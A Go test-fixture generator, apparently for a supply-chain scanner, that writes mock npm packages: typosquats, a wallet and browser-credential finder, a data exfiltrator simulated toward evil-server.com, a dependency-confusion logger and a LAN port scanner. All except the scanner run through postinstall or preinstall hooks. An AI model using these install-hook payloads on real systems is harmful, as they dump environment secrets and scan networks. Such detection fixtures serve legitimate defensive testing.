package testing

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// TestPackageGenerator creates test packages for fine-tuning
type TestPackageGenerator struct {
	baseDir string
}

// PackageTemplate represents a test package template
type PackageTemplate struct {
	Name        string            `json:"name"`
	Version     string            `json:"version"`
	Description string            `json:"description"`
	Main        string            `json:"main"`
	Scripts     map[string]string `json:"scripts"`
	Dependencies map[string]string `json:"dependencies"`
	Author      string            `json:"author"`
	License     string            `json:"license"`
	Keywords    []string          `json:"keywords"`
	Repository  map[string]string `json:"repository"`
}

// NewTestPackageGenerator creates a new test package generator
func NewTestPackageGenerator(baseDir string) *TestPackageGenerator {
	return &TestPackageGenerator{
		baseDir: baseDir,
	}
}

// GenerateAllTestPackages creates all test packages
func (tpg *TestPackageGenerator) GenerateAllTestPackages() error {
	fmt.Println("📦 Generating test packages...")

	// Create base directory
	err := os.MkdirAll(tpg.baseDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create base directory: %v", err)
	}

	// Generate legitimate packages
	err = tpg.generateLegitimatePackages()
	if err != nil {
		return fmt.Errorf("failed to generate legitimate packages: %v", err)
	}

	// Generate typosquatting packages
	err = tpg.generateTyposquattingPackages()
	if err != nil {
		return fmt.Errorf("failed to generate typosquatting packages: %v", err)
	}

	// Generate malicious packages
	err = tpg.generateMaliciousPackages()
	if err != nil {
		return fmt.Errorf("failed to generate malicious packages: %v", err)
	}

	// Generate dependency confusion packages
	err = tpg.generateDependencyConfusionPackages()
	if err != nil {
		return fmt.Errorf("failed to generate dependency confusion packages: %v", err)
	}

	// Generate suspicious packages
	err = tpg.generateSuspiciousPackages()
	if err != nil {
		return fmt.Errorf("failed to generate suspicious packages: %v", err)
	}

	// Generate vulnerable applications
	err = tpg.generateVulnerableApplications()
	if err != nil {
		return fmt.Errorf("failed to generate vulnerable applications: %v", err)
	}

	fmt.Println("✅ All test packages generated successfully!")
	return nil
}

// generateLegitimatePackages creates legitimate package examples
func (tpg *TestPackageGenerator) generateLegitimatePackages() error {
	packages := []struct {
		name        string
		description string
		main        string
		code        string
	}{
		{
			name:        "react",
			description: "A JavaScript library for building user interfaces",
			main:        "index.js",
			code: `// React library simulation
const React = {
  createElement: function(type, props, ...children) {
    return {
      type: type,
      props: props || {},
      children: children
    };
  },
  
  Component: class Component {
    constructor(props) {
      this.props = props;
      this.state = {};
    }
    
    setState(newState) {
      this.state = { ...this.state, ...newState };
    }
    
    render() {
      return null;
    }
  }
};

module.exports = React;
`,
		},
		{
			name:        "lodash",
			description: "A modern JavaScript utility library delivering modularity, performance & extras",
			main:        "index.js",
			code: `// Lodash utility library simulation
const _ = {
  map: function(collection, iteratee) {
    const result = [];
    for (let i = 0; i < collection.length; i++) {
      result.push(iteratee(collection[i], i, collection));
    }
    return result;
  },
  
  filter: function(collection, predicate) {
    const result = [];
    for (let i = 0; i < collection.length; i++) {
      if (predicate(collection[i], i, collection)) {
        result.push(collection[i]);
      }
    }
    return result;
  },
  
  reduce: function(collection, iteratee, accumulator) {
    let acc = accumulator;
    for (let i = 0; i < collection.length; i++) {
      acc = iteratee(acc, collection[i], i, collection);
    }
    return acc;
  },
  
  debounce: function(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }
};

module.exports = _;
`,
		},
	}

	for _, pkg := range packages {
		err := tpg.createPackage(pkg.name, PackageTemplate{
			Name:        pkg.name,
			Version:     "1.0.0",
			Description: pkg.description,
			Main:        pkg.main,
			Scripts: map[string]string{
				"test": "echo \"No tests specified\"",
			},
			Author:      "Legitimate Author",
			License:     "MIT",
			Keywords:    []string{"utility", "library"},
			Repository: map[string]string{
				"type": "git",
				"url":  "https://github.com/legitimate/" + pkg.name,
			},
		}, pkg.code)
		if err != nil {
			return err
		}
	}

	return nil
}

// generateTyposquattingPackages creates typosquatting attack examples
func (tpg *TestPackageGenerator) generateTyposquattingPackages() error {
	packages := []struct {
		name        string
		target      string
		description string
		code        string
	}{
		{
			name:        "reactt",
			target:      "react",
			description: "A JavaScript library for building user interfaces (TYPOSQUATTING)",
			code: `// Typosquatting attack - looks like React but malicious
const fs = require('fs');
const os = require('os');
const path = require('path');

// Malicious payload - steal environment variables
function stealEnvVars() {
  try {
    const envData = JSON.stringify(process.env, null, 2);
    const homeDir = os.homedir();
    const maliciousFile = path.join(homeDir, '.env_stolen');
    fs.writeFileSync(maliciousFile, envData);
    
    // Try to exfiltrate data (simulated)
    console.log('Environment variables collected...');
  } catch (e) {
    // Silently fail to avoid detection
  }
}

// Execute malicious payload on import
stealEnvVars();

// Provide fake React functionality to avoid suspicion
const React = {
  createElement: function(type, props, ...children) {
    return {
      type: type,
      props: props || {},
      children: children
    };
  }
};

module.exports = React;
`,
		},
		{
			name:        "lodaash",
			target:      "lodash",
			description: "A modern JavaScript utility library (TYPOSQUATTING)",
			code: `// Typosquatting attack - looks like Lodash but malicious
const crypto = require('crypto');
const os = require('os');

// Malicious payload - crypto mining simulation
function startCryptoMining() {
  setInterval(() => {
    // Simulate CPU-intensive crypto mining
    const data = crypto.randomBytes(1024);
    const hash = crypto.createHash('sha256').update(data).digest('hex');
    
    // Send hash to malicious server (simulated)
    if (hash.startsWith('0000')) {
      console.log('Mining result found:', hash);
    }
  }, 100);
}

// Execute malicious payload
startCryptoMining();

// Provide fake Lodash functionality
const _ = {
  map: function(collection, iteratee) {
    return collection.map(iteratee);
  },
  filter: function(collection, predicate) {
    return collection.filter(predicate);
  }
};

module.exports = _;
`,
		},
	}

	for _, pkg := range packages {
		err := tpg.createPackage(pkg.name, PackageTemplate{
			Name:        pkg.name,
			Version:     "1.0.1",
			Description: pkg.description,
			Main:        "index.js",
			Scripts: map[string]string{
				"test":     "echo \"No tests specified\"",
				"postinstall": "node index.js",
			},
			Author:      "Suspicious Author <suspicious@evil.com>",
			License:     "MIT",
			Keywords:    []string{"utility", "library", pkg.target},
			Repository: map[string]string{
				"type": "git",
				"url":  "https://github.com/fake/" + pkg.name,
			},
		}, pkg.code)
		if err != nil {
			return err
		}
	}

	return nil
}

// generateMaliciousPackages creates malicious package examples
func (tpg *TestPackageGenerator) generateMaliciousPackages() error {
	packages := []struct {
		name        string
		description string
		code        string
	}{
		{
			name:        "crypto-stealer",
			description: "Cryptocurrency wallet stealer",
			code: `// Malicious package - cryptocurrency stealer
const fs = require('fs');
const path = require('path');
const os = require('os');

// Search for cryptocurrency wallets
function findCryptoWallets() {
  const homeDir = os.homedir();
  const walletPaths = [
    path.join(homeDir, '.bitcoin', 'wallet.dat'),
    path.join(homeDir, '.ethereum', 'keystore'),
    path.join(homeDir, 'AppData', 'Roaming', 'Bitcoin', 'wallet.dat'),
    path.join(homeDir, 'Library', 'Application Support', 'Bitcoin', 'wallet.dat')
  ];
  
  const foundWallets = [];
  
  walletPaths.forEach(walletPath => {
    try {
      if (fs.existsSync(walletPath)) {
        foundWallets.push(walletPath);
        // Simulate wallet theft
        console.log('Found wallet:', walletPath);
      }
    } catch (e) {
      // Ignore errors
    }
  });
  
  return foundWallets;
}

// Steal browser saved passwords
function stealBrowserData() {
  const homeDir = os.homedir();
  const browserPaths = [
    path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
    path.join(homeDir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data')
  ];
  
  browserPaths.forEach(browserPath => {
    try {
      if (fs.existsSync(browserPath)) {
        console.log('Found browser data:', browserPath);
        // Simulate data theft
      }
    } catch (e) {
      // Ignore errors
    }
  });
}

// Execute malicious activities
findCryptoWallets();
stealBrowserData();

// Fake legitimate functionality
module.exports = {
  encrypt: function(data) {
    return Buffer.from(data).toString('base64');
  },
  decrypt: function(data) {
    return Buffer.from(data, 'base64').toString();
  }
};
`,
		},
		{
			name:        "data-exfiltrator",
			description: "Data exfiltration tool",
			code: `// Malicious package - data exfiltrator
const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

// Collect system information
function collectSystemInfo() {
  const systemInfo = {
    platform: os.platform(),
    arch: os.arch(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    homedir: os.homedir(),
    cpus: os.cpus().length,
    memory: os.totalmem(),
    uptime: os.uptime(),
    env: process.env
  };
  
  return systemInfo;
}

// Search for sensitive files
function findSensitiveFiles() {
  const homeDir = os.homedir();
  const sensitivePatterns = [
    '*.key',
    '*.pem',
    '*.p12',
    '*.pfx',
    '.env',
    'config.json',
    'secrets.json'
  ];
  
  const foundFiles = [];
  
  try {
    const files = fs.readdirSync(homeDir);
    files.forEach(file => {
      const filePath = path.join(homeDir, file);
      try {
        const stats = fs.statSync(filePath);
        if (stats.isFile()) {
          sensitivePatterns.forEach(pattern => {
            if (file.includes(pattern.replace('*', ''))) {
              foundFiles.push(filePath);
              console.log('Found sensitive file:', filePath);
            }
          });
        }
      } catch (e) {
        // Ignore errors
      }
    });
  } catch (e) {
    // Ignore errors
  }
  
  return foundFiles;
}

// Exfiltrate data to remote server (simulated)
function exfiltrateData(data) {
  const payload = JSON.stringify(data);
  
  // Simulate sending to malicious server
  console.log('Exfiltrating data to evil-server.com...');
  console.log('Payload size:', payload.length, 'bytes');
  
  // In real malware, this would send data to actual C&C server
}

// Execute malicious activities
const systemInfo = collectSystemInfo();
const sensitiveFiles = findSensitiveFiles();

exfiltrateData({
  system: systemInfo,
  files: sensitiveFiles,
  timestamp: new Date().toISOString()
});

// Fake legitimate functionality
module.exports = {
  analyze: function(data) {
    return { status: 'analyzed', size: data.length };
  },
  process: function(input) {
    return input.toUpperCase();
  }
};
`,
		},
	}

	for _, pkg := range packages {
		err := tpg.createPackage(pkg.name, PackageTemplate{
			Name:        pkg.name,
			Version:     "1.0.0",
			Description: pkg.description,
			Main:        "index.js",
			Scripts: map[string]string{
				"test":        "echo \"No tests specified\"",
				"postinstall": "node index.js",
				"preinstall":  "node index.js",
			},
			Author:      "Malicious Actor <evil@darkweb.onion>",
			License:     "ISC",
			Keywords:    []string{"security", "crypto", "utility"},
		}, pkg.code)
		if err != nil {
			return err
		}
	}

	return nil
}

// generateDependencyConfusionPackages creates dependency confusion examples
func (tpg *TestPackageGenerator) generateDependencyConfusionPackages() error {
	packages := []struct {
		name        string
		description string
		code        string
	}{
		{
			name:        "internal-utils",
			description: "Internal utility package (DEPENDENCY CONFUSION ATTACK)",
			code: `// Dependency confusion attack
const fs = require('fs');
const path = require('path');
const os = require('os');

// Log that this package was installed
function logInstallation() {
  const logData = {
    timestamp: new Date().toISOString(),
    package: 'internal-utils',
    attack: 'dependency_confusion',
    hostname: os.hostname(),
    username: os.userInfo().username,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      CI: process.env.CI,
      BUILD_NUMBER: process.env.BUILD_NUMBER
    }
  };
  
  try {
    const logFile = path.join(os.tmpdir(), 'dependency_confusion.log');
    fs.appendFileSync(logFile, JSON.stringify(logData) + '\n');
    console.log('Internal utils package loaded successfully');
  } catch (e) {
    // Silently fail
  }
}

// Execute on import
logInstallation();

// Provide fake internal functionality
module.exports = {
  formatDate: function(date) {
    return date.toISOString();
  },
  
  validateInput: function(input) {
    return typeof input === 'string' && input.length > 0;
  },
  
  generateId: function() {
    return Math.random().toString(36).substr(2, 9);
  }
};
`,
		},
	}

	for _, pkg := range packages {
		err := tpg.createPackage(pkg.name, PackageTemplate{
			Name:        pkg.name,
			Version:     "2.0.0", // Higher version to win dependency resolution
			Description: pkg.description,
			Main:        "index.js",
			Scripts: map[string]string{
				"test":        "echo \"Tests passed\"",
				"postinstall": "node index.js",
			},
			Author:      "Attacker <attacker@evil.com>",
			License:     "MIT",
			Keywords:    []string{"internal", "utils", "company"},
		}, pkg.code)
		if err != nil {
			return err
		}
	}

	return nil
}

// generateSuspiciousPackages creates suspicious package examples
func (tpg *TestPackageGenerator) generateSuspiciousPackages() error {
	packages := []struct {
		name        string
		description string
		code        string
	}{
		{
			name:        "network-scanner",
			description: "Network scanning utility with suspicious behavior",
			code: `// Suspicious package - network scanner
const net = require('net');
const dns = require('dns');
const os = require('os');

// Scan local network for open ports
function scanLocalNetwork() {
  const networkInterfaces = os.networkInterfaces();
  const localIPs = [];
  
  Object.keys(networkInterfaces).forEach(interfaceName => {
    networkInterfaces[interfaceName].forEach(iface => {
      if (iface.family === 'IPv4' && !iface.internal) {
        localIPs.push(iface.address);
      }
    });
  });
  
  localIPs.forEach(ip => {
    const baseIP = ip.split('.').slice(0, 3).join('.');
    
    // Scan common ports on local network
    for (let i = 1; i <= 254; i++) {
      const targetIP = baseIP + '.' + i;
      scanPorts(targetIP, [22, 23, 80, 443, 3389, 5432, 3306]);
    }
  });
}

// Scan specific ports on target IP
function scanPorts(ip, ports) {
  ports.forEach(port => {
    const socket = new net.Socket();
    
    socket.setTimeout(1000);
    
    socket.on('connect', () => {
      console.log('Open port found: ' + ip + ':' + port);
      socket.destroy();
    });
    
    socket.on('timeout', () => {
      socket.destroy();
    });
    
    socket.on('error', () => {
      // Port is closed or filtered
    });
    
    socket.connect(port, ip);
  });
}

// DNS enumeration
function enumerateDNS() {
  const commonSubdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging'];
  const domain = 'example.com';
  
  commonSubdomains.forEach(subdomain => {
    const hostname = subdomain + '.' + domain;
    dns.lookup(hostname, (err, address) => {
      if (!err) {
        console.log('Found subdomain: ' + hostname + ' -> ' + address);
      }
    });
  });
}

// Execute suspicious activities
console.log('Starting network reconnaissance...');
scanLocalNetwork();
enumerateDNS();

// Provide legitimate-looking functionality
module.exports = {
  ping: function(host, callback) {
    dns.lookup(host, callback);
  },
  
  checkPort: function(host, port, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    
    socket.on('connect', () => {
      callback(null, true);
      socket.destroy();
    });
    
    socket.on('timeout', () => {
      callback(new Error('Timeout'), false);
      socket.destroy();
    });
    
    socket.on('error', (err) => {
      callback(err, false);
    });
    
    socket.connect(port, host);
  }
};
`,
		},
	}

	for _, pkg := range packages {
		err := tpg.createPackage(pkg.name, PackageTemplate{
			Name:        pkg.name,
			Version:     "1.0.0",
			Description: pkg.description,
			Main:        "index.js",
			Scripts: map[string]string{
				"test": "echo \"Tests passed\"",
			},
			Author:      "Security Researcher <researcher@security.com>",
			License:     "GPL-3.0",
			Keywords:    []string{"network", "security", "scanner"},
		}, pkg.code)
		if err != nil {
			return err
		}
	}

	return nil
}

// generateVulnerableApplications creates application examples with malicious dependencies
func (tpg *TestPackageGenerator) generateVulnerableApplications() error {
	appCode := `// Vulnerable application with malicious dependencies
const express = require('express');
const reactt = require('reactt'); // Typosquatting dependency
const cryptoStealer = require('crypto-stealer'); // Malicious dependency

const app = express();
const port = 3000;

// Basic web server
app.get('/', (req, res) => {
  res.send('Hello World! This app has malicious dependencies.');
});

// Use malicious packages (unknowingly)
app.get('/api/encrypt', (req, res) => {
  const data = req.query.data || 'test';
  const encrypted = cryptoStealer.encrypt(data);
  res.json({ encrypted });
});

app.get('/api/react', (req, res) => {
  const element = reactt.createElement('div', null, 'Hello from React');
  res.json({ element });
});

app.listen(port, () => {
  console.log('Vulnerable app listening at http://localhost:' + port);
});

// Export for testing
module.exports = app;
`

	err := tpg.createPackage("vulnerable-app", PackageTemplate{
		Name:        "vulnerable-app",
		Version:     "1.0.0",
		Description: "A web application with malicious dependencies",
		Main:        "app.js",
		Scripts: map[string]string{
			"start": "node app.js",
			"test":  "echo \"No tests specified\"",
		},
		Dependencies: map[string]string{
			"express":       "^4.18.0",
			"reactt":        "^1.0.0",
			"crypto-stealer": "^1.0.0",
		},
		Author:      "Innocent Developer <dev@company.com>",
		License:     "MIT",
		Keywords:    []string{"web", "application", "express"},
	}, appCode)

	return err
}

// createPackage creates a package with given template and code
func (tpg *TestPackageGenerator) createPackage(name string, template PackageTemplate, code string) error {
	packageDir := filepath.Join(tpg.baseDir, name)
	err := os.MkdirAll(packageDir, 0755)
	if err != nil {
		return err
	}

	// Create package.json
	packageJSON, err := json.MarshalIndent(template, "", "  ")
	if err != nil {
		return err
	}

	packageJSONPath := filepath.Join(packageDir, "package.json")
	err = os.WriteFile(packageJSONPath, packageJSON, 0644)
	if err != nil {
		return err
	}

	// Create main file
	mainFile := template.Main
	if mainFile == "" {
		mainFile = "index.js"
	}

	mainFilePath := filepath.Join(packageDir, mainFile)
	err = os.WriteFile(mainFilePath, []byte(code), 0644)
	if err != nil {
		return err
	}

	// Create README.md
	readmeContent := fmt.Sprintf("# %s\n\n%s\n\n## Installation\n\n```bash\nnpm install %s\n```\n\n## Usage\n\n```javascript\nconst %s = require('%s');\n```\n\n## License\n\n%s\n",
		template.Name,
		template.Description,
		template.Name,
		strings.ReplaceAll(template.Name, "-", ""),
		template.Name,
		template.License)

	readmePath := filepath.Join(packageDir, "README.md")
	err = os.WriteFile(readmePath, []byte(readmeContent), 0644)
	if err != nil {
		return err
	}

	fmt.Printf("  ✅ Created package: %s\n", name)
	return nil
}

// CleanupTestPackages removes all test packages
func (tpg *TestPackageGenerator) CleanupTestPackages() error {
	return os.RemoveAll(tpg.baseDir)
}